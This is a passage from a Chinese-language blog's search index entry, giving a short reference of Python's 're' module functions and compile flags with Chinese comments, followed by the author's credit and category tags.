<h2 id="2-RE模块"><a href="#2-RE模块" class="headerlink" title="2.RE模块"></a>2.RE模块</h2><figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">import re       <span class="comment"># 下面仅列出常用方法</span></span><br><span class="line"></span><br><span class="line">re.compile(pattern[, <span class="keyword">flags</span>]) 	    <span class="comment"># 创建一个正则表达式对象</span></span><br><span class="line">re.search(pattern, string[, <span class="keyword">flags</span>]) <span class="comment"># 查找符合表达式的第一个对象</span></span><br><span class="line">re.<span class="built_in">match</span>(pattern, string[, <span class="keyword">flags</span>])  <span class="comment"># 查找符合表达式的对象</span></span><br><span class="line">re.findall(pattern, string, <span class="keyword">flags</span>)  <span class="comment"># 获取字符串中所有匹配的字符串，返回一个列表</span></span><br><span class="line">re.split(pattern, string[, maxsplit=<span class="number">0</span>, <span class="keyword">flags</span>]) <span class="comment"># 根据模式的匹配项分割字符串</span></span><br><span class="line">re.sub(pattern,repl, string[, count=<span class="number">0</span>, <span class="keyword">flags</span>]) <span class="comment"># 将字符串中所有的pattern的匹配项用repl替换</span></span><br><span class="line">re.escape(string) 		    <span class="comment"># 将字符串所有特殊正则表达式字符转义</span></span><br><span class="line"></span><br><span class="line">pattern <span class="comment"># 编译时用的表达式字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">flags</span>   <span class="comment"># 编译标志位</span></span><br><span class="line">re.S(DOTALL)	  <span class="comment"># 使.匹配包括换行在内的所有字符</span></span><br><span class="line">re.I(IGNORECASE)  <span class="comment"># 使匹配对大小写不敏感</span></span><br><span class="line">re.L(LOCALE)      <span class="comment"># 做本地化识别（locale-aware)匹配，法语等</span></span><br><span class="line">re.M(MULTILINE)   <span class="comment"># 多行匹配，影响^和$</span></span><br><span class="line">re.X(VERBOSE)     <span class="comment"># 该标志通过给予更灵活的格式以便将正则表达式写得更易于理解</span></span><br><span class="line">re.U(Unicode)	  <span class="comment"># 根据Unicode字符集解析字符，这个标志影响\w,\W,\b,\B</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="本文作者：Sh4Nn0n"><a href="#本文作者：Sh4Nn0n" class="headerlink" title="本文作者：Sh4Nn0n"></a>本文作者：Sh4Nn0n</h3><h3 id="本文首发于Sh4Nn0n’s-Blog，写文不易，转载请注明出处。"><a href="#本文首发于Sh4Nn0n’s-Blog，写文不易，转载请注明出处。" class="headerlink" title="本文首发于Sh4Nn0n’s Blog，写文不易，转载请注明出处。"></a>本文首发于<a href="http://www.sh4nn0n.com" target="_blank" rel="noopener">Sh4Nn0n’s Blog</a>，写文不易，转载请注明出处。</h3>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
</search>
